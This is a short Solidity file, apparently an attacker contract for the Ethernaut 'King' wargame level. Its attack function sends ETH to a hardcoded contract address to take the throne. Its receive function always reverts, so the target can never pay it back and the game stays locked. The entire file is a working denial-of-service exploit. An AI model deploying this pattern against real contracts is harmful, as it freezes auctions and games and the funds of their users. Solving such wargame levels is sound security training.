// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract King {
    function attack() public payable {
        (bool success, ) = payable(
            address(0x32B2EA732264905DE707547610A816b0aC562c48)
        ).call{value: msg.value}("");
        require(success);
    }

    receive() external payable {
        require(false);
    }
}